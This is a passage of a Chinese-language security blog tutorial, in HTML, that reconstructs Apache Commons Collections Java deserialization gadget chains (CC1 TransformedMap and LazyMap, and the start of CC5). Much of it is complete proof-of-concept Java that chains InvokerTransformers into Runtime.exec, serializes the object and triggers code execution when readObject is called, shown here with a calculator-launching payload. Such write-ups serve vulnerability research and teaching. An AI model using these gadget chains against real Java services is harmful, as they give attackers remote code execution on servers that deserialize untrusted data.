<span class="type">Map</span> <span class="variable">myMap</span> <span class="operator">=</span> TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);<span class="comment">//malicious map</span></span><br><span class="line">        Map.<span class="type">Entry</span> <span class="variable">finalMap</span> <span class="operator">=</span> (Map.Entry) myMap.entrySet().iterator().next();<span class="comment">//传入parent</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;tm.cer&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(finalMap);</span><br><span class="line">        objectOutputStream.flush();</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">        fileOutputStream.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        * 服务端反序列化读取，并触发漏洞</span></span><br><span class="line"><span class="comment">        * */</span></span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;tm.cer&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        Map.<span class="type">Entry</span> <span class="variable">entry</span> <span class="operator">=</span> (Map.Entry) objectInputStream.readObject();</span><br><span class="line">        entry.setValue(<span class="string">&quot;leihehe&quot;</span>);<span class="comment">//触发漏洞</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>原本以为成功了，结果发现：<code>MapEntry</code>不能被序列化<img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210731225703306.png" alt="image-20210731225703306"></p>
<p>去掉序列化和反序列化过程，成功弹出计算器</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210731225956030.png" alt="image-20210731225956030"></p>
<h4 id="第六步：-AnnotationInvocationHandler"><a href="#第六步：-AnnotationInvocationHandler" class="headerlink" title="第六步： AnnotationInvocationHandler"></a>第六步： AnnotationInvocationHandler</h4><p>虽然在第五步我们不能序列化，但幸运的是<code>AnnotationInvocationHandler</code>中出现了我们想要的内容：</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210731220804329.png" alt="image-20210731220804329"></p>
<p><code>AnnotationInvocationHandler</code>拥有自己的<code>readObject()</code>方法，且方法中涉及到了<code>Map</code>的操作，让我们来详细分析一下。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        var1.defaultReadObject();</span><br><span class="line">        <span class="type">AnnotationType</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="literal">null</span>;<span class="comment">//var2代表AnnotationType（注释类型） -》 为空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            var2 = AnnotationType.getInstance(<span class="built_in">this</span>.type);<span class="comment">//根据【this.type】给var2赋值为一个实例</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalArgumentException var9) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">var3</span> <span class="operator">=</span> var2.memberTypes();<span class="comment">//var3为var2 Annotation中的[value:ElementType]</span></span><br><span class="line">        <span class="type">Iterator</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="built_in">this</span>.memberValues.entrySet().iterator();<span class="comment">//*****var4会直接将memberValues自身作为parent传入，和第五步我们自己构造的一模一样！！！如果没看懂的，建议看第五步仔细阅读。</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(var4.hasNext()) &#123;<span class="comment">//如果var4中还有下一个key-Value对</span></span><br><span class="line">            <span class="type">Entry</span> <span class="variable">var5</span> <span class="operator">=</span> (Entry)var4.next(); <span class="comment">//获取下一个key-value对，并赋值给var5</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">var6</span> <span class="operator">=</span> (String)var5.getKey();<span class="comment">//获取var5的key</span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">var7</span> <span class="operator">=</span> (Class)var3.get(var6);<span class="comment">//在var3中查看有没有这个key，把结果赋值给var7</span></span><br><span class="line">            <span class="keyword">if</span> (var7 != <span class="literal">null</span>) &#123;<span class="comment">//如果var3中有这个key</span></span><br><span class="line">                <span class="type">Object</span> <span class="variable">var8</span> <span class="operator">=</span> var5.getValue();<span class="comment">//获取这个key-Value对中的value</span></span><br><span class="line">                <span class="keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                    <span class="comment">//*****如果var7不是var8（value）的实例，而且 value不是ExceptionProxy的实例，call var5(Map)的setValue()方法</span></span><br><span class="line">                    var5.setValue((<span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(var8.getClass() + <span class="string">&quot;[&quot;</span> + var8 + <span class="string">&quot;]&quot;</span>)).setMember((Method)var2.members().get(var6)));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>我们看到了熟悉的<code>this.memberValues.entrySet().iterator();</code>，在后面还有<code>setValue()</code>，这已经足够我们利用了。</p>
<p>上面代码<code>comment</code>中的<code>【this.type】</code>和<code>【this.memberValues】</code>都是可控的 -》 在constructor中可以传入。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">AnnotationInvocationHandler(Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; var1, Map&lt;String, Object&gt; var2) &#123;</span><br><span class="line">    Class[] var3 = var1.getInterfaces();</span><br><span class="line">    <span class="keyword">if</span> (var1.isAnnotation() &amp;&amp; var3.length == <span class="number">1</span> &amp;&amp; var3[<span class="number">0</span>] == Annotation.class) &#123;</span><br><span class="line">        <span class="built_in">this</span>.type = var1;</span><br><span class="line">        <span class="built_in">this</span>.memberValues = var2;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AnnotationFormatError</span>(<span class="string">&quot;Attempt to create proxy for a non-annotation type.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>memberValues</code>我们赋值为<code>TransformedMap.decorate()</code>的返回值，那<code>type</code>呢？我们可以发现<code>type</code>是一种<code>Annotation</code>（注释），如果有同学用过<code>SpringBoot或Spring</code>的话，就会理解<code>Annotation</code>的意义。所以此处我们是要传一个Annotation的Class过去。再看<code>readObject()</code>中的逻辑：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">          ...</span><br><span class="line">var2 = AnnotationType.getInstance(<span class="built_in">this</span>.type);<span class="comment">//根据【this.type】给var2赋值为一个Annotation实例（实际会获取到注解的各种属性，包括注解元素，注解元素的默认值，生命周期，是否继承等等。）</span></span><br><span class="line">      <span class="type">Map</span> <span class="variable">var3</span> <span class="operator">=</span> var2.memberTypes();<span class="comment">//var3为var2 Annotation中的[value:ElementType]</span></span><br><span class="line">      <span class="keyword">while</span>(var4.hasNext()) &#123;</span><br><span class="line">          <span class="type">Entry</span> <span class="variable">var5</span> <span class="operator">=</span> (Entry)var4.next(); <span class="comment">//获取下一个entry</span></span><br><span class="line">          <span class="type">String</span> <span class="variable">var6</span> <span class="operator">=</span> (String)var5.getKey();<span class="comment">//获取var5的key</span></span><br><span class="line">          <span class="type">Class</span> <span class="variable">var7</span> <span class="operator">=</span> (Class)var3.get(var6);<span class="comment">//在var3 memberTypes中查看有没有这个key，把结果赋值给var7</span></span><br><span class="line">          <span class="keyword">if</span> (var7 != <span class="literal">null</span>) &#123;<span class="comment">//如果var3 memberTypes中有这个key</span></span><br><span class="line">              <span class="type">Object</span> <span class="variable">var8</span> <span class="operator">=</span> var5.getValue();<span class="comment">//获取这个key-Value对中的value</span></span><br><span class="line">              <span class="keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                  <span class="comment">//*****如果var7不是var8（value）的实例，而且 value不是ExceptionProxy的实例，触发漏洞</span></span><br><span class="line">                  var5.setValue((<span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(var8.getClass() + <span class="string">&quot;[&quot;</span> + var8 + <span class="string">&quot;]&quot;</span>)).setMember((Method)var2.members().get(var6)));</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>

<p>我们传入的这个type需要有<code>memberTypes</code>，且我们的<strong>map</strong>中的key必须要和<code>memberTypes</code>的key保持<strong>一致。</strong></p>
<p>跟踪<code>Annotation</code>这个<code>Class</code>，我们可以发现所有<code>Annotation</code>的<code>class。</code></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210731231645279.png" alt="image-20210731231645279"></p>
<p>这里我们可以简单分析一下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Documented</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="meta">@Target(ElementType.ANNOTATION_TYPE)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> Target &#123;</span><br><span class="line">    ElementType[] value();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此处<code>Target</code>的<code>memberTypes</code>就是 <code>[value:ElementType]</code> =》 <strong>key-value</strong>的形式。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Documented</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="meta">@Target(ElementType.ANNOTATION_TYPE)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> Retention &#123;</span><br><span class="line">    RetentionPolicy <span class="title function_">value</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此处<code>Retention</code>的<code>memberTypes</code>就是 <code>[value:RetentionPolicy]</code> =》 <strong>key-value</strong>的形式`。</p>
<p>这些<code>Annotation</code>的元注解都可以通过<code>@</code>符号来调用，例如<code>@Target</code><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210731232549977.png" alt="image-20210731232549977"></p>
<p>因此我们可以选择传入<code>Target.class</code>或者<code>Retention.class</code>, <code>map</code>的<code>key</code>值为<code>value</code>。</p>
<h4 id="最终POC"><a href="#最终POC" class="headerlink" title="最终POC"></a>最终POC</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformedMapExploit</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, IOException, InstantiationException &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        * 客户端构造payload，并序列化文件</span></span><br><span class="line"><span class="comment">        * */</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),<span class="comment">//返回Runtime Class</span></span><br><span class="line">                <span class="comment">//获取getRuntime方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="comment">//call getRuntime方法得到Runtime实例</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="comment">//创建invokerTransformer，并利用constructor对iMethodName、iParamTypes、iArgs进行赋值</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将上面的数组用chainedTransformer串起来，数组里的transformer会被挨个执行transform()方法</span></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;anyContent&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">myMap</span> <span class="operator">=</span> TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);<span class="comment">//malicious map</span></span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<span class="comment">//反射获取该类</span></span><br><span class="line">        Constructor&lt;?&gt; aConstructor = aClass.getDeclaredConstructor(Class.class, Map.class);<span class="comment">//获取构造方法</span></span><br><span class="line">        aConstructor.setAccessible(<span class="literal">true</span>);<span class="comment">//取消构造方法限制</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> aConstructor.newInstance(Target.class, myMap);<span class="comment">//传入参数和malicious map</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line"></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;tm.cer&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(o);</span><br><span class="line">        objectOutputStream.flush();</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">        fileOutputStream.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        * 服务端反序列化读取，并触发漏洞</span></span><br><span class="line"><span class="comment">        * */</span></span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;tm.cer&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        objectInputStream.readObject();<span class="comment">//触发漏洞</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>成功弹出计算器，这样服务端只需要<code>readObject()</code>即可触发反序列化漏洞了！</p>
<h3 id="LazyMap版本-POC构造过程-CommonsCollections-1"><a href="#LazyMap版本-POC构造过程-CommonsCollections-1" class="headerlink" title="LazyMap版本 - POC构造过程(CommonsCollections 1)"></a>LazyMap版本 - POC构造过程(CommonsCollections 1)</h3><h4 id="Intro-1"><a href="#Intro-1" class="headerlink" title="Intro"></a>Intro</h4><p>第一步到第三步和<code>TransformedMap</code>版本都是一模一样的，主要问题在于如何call到<code>ChainedTrasnformer.transform()</code></p>
<p>剩下的步骤和cc3的LazyMap、AnnotationInvocationHandler、动态代理一模一样，<a href="#lazyMap">点这里看</a></p>
<h4 id="Payload构造"><a href="#Payload构造" class="headerlink" title="Payload构造"></a>Payload构造</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LazyMapExploit</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, NoSuchFieldException &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 客户端构造payload，并序列化文件</span></span><br><span class="line"><span class="comment">         * */</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),<span class="comment">//返回Runtime Class</span></span><br><span class="line">                <span class="comment">//获取getRuntime方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="comment">//call getRuntime方法得到Runtime实例</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="comment">//创建invokerTransformer，并利用constructor对iMethodName、iParamTypes、iArgs进行赋值</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//将上面的数组用chainedTransformer串起来，数组里的transformer会被挨个执行transform()方法</span></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, chainedTransformer);</span><br><span class="line">        <span class="type">String</span> <span class="variable">classToSerialize</span> <span class="operator">=</span> <span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>;</span><br><span class="line">        <span class="keyword">final</span> Constructor&lt;?&gt; constructor = Class.forName(classToSerialize).getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">secondInvocationHandler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class, lazyMap);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">Map</span> <span class="variable">testMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">evilMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(</span><br><span class="line">                testMap.getClass().getClassLoader(),</span><br><span class="line">                testMap.getClass().getInterfaces(),</span><br><span class="line">                secondInvocationHandler</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">final</span> Constructor&lt;?&gt; ctor = Class.forName(classToSerialize).getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">        ctor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) ctor.newInstance(Override.class, evilMap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;lz.cer&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(handler);<span class="comment">//序列化badAttributeValueExpException</span></span><br><span class="line">        objectOutputStream.flush();</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">        fileOutputStream.close();</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 服务端反序列化读取，并触发漏洞</span></span><br><span class="line"><span class="comment">         * */</span></span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;lz.cer&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        objectInputStream.readObject();<span class="comment">//只需要readObject()就会触发漏洞</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="LazyMap版本-POC构造过程（CommonsCollections-5）"><a href="#LazyMap版本-POC构造过程（CommonsCollections-5）" class="headerlink" title="LazyMap版本 - POC构造过程（CommonsCollections 5）"></a>LazyMap版本 - POC构造过程（CommonsCollections 5）</h3><h4 id="Intro-2"><a href="#Intro-2" class="headerlink" title="Intro"></a>Intro</h4><hr>
<p><span id="cc5">3/12/2021 补充：</span></p>
<p>之前学习的时候看的资料太杂，学到cc5的时候发现这个LazyMap版本其实是cc5的，CC1的LazyMap版本其实是用到了<strong>代理</strong>方面的知识。</p>
<hr>
<p>我们的利用链需要用到如下的Class</p>
<ul>
<li>InvokerTransformer</li>
<li>ChainedTrasnformer</li>
<li>ConstantTransformer</li>
<li>LazyMap</li>
<li>BadAttributeValueExpException</li>
</ul>
<h4 id="第一步到第三步："><a href="#第一步到第三步：" class="headerlink" title="第一步到第三步："></a>第一步到第三步：</h4><p>和之前的TransformedMap版本低前三步是一样的。</p>
<h4 id="第四步：LazyMap-get"><a href="#第四步：LazyMap-get" class="headerlink" title="第四步：LazyMap - get()"></a>第四步：LazyMap - get()</h4><p>同<code>TransformedMap</code>一样，我们需要寻找可以执行<code>chainedTransformer</code>的<code>transform()</code>方法的利用链。</p>
<p>在<code>LazyMap</code>中，我们发现了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">super</span>.map.containsKey(key)) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">this</span>.factory.transform(key);<span class="comment">//重点</span></span><br><span class="line">        <span class="built_in">super</span>.map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.map.get(key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在这段代码中，<code>this.factory.transform(key)</code>就执行了<code>transform()</code>方法，如果我们能让<code>factory</code>被赋值为我们构造好的<code>chainedTransformer</code>，就可以触发漏洞了。</p>
<p>我们发现LazyMap有两个构造函数，其中一个构造函数会传入以<code>Transformer</code>类型的参数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="title function_">LazyMap</span><span class="params">(Map map, Transformer factory)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(map);</span><br><span class="line">    <span class="keyword">if</span> (factory == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Factory must not be null&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.factory = factory;<span class="comment">//我们可以控制factory</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们尝试构造POC时new一个新的LazyMap，并将我们的链传进去，发现无法被构造。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210805215256433.png" alt="image-20210805215256433"></p>
<p>该构造方法是<strong>protected</strong>修饰的，意味着我们不能直接访问。</p>
<p>在<code>LazyMap</code>中，还有一个我们熟悉的<code>decorate()</code>方法，该方法会返回我们想要的instance</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210805215440540.png" alt="image-20210805215440540"></p>
<p>于是，现在的<strong>POC</strong>可以构造如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LazyMapExploit</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 客户端构造payload，并序列化文件</span></span><br><span class="line"><span class="comment">         * */</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),<span class="comment">//返回Runtime Class</span></span><br><span class="line">                <span class="comment">//获取getRuntime方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="comment">//call getRuntime方法得到Runtime实例</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="comment">//创建invokerTransformer，并利用constructor对iMethodName、iParamTypes、iArgs进行赋值</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        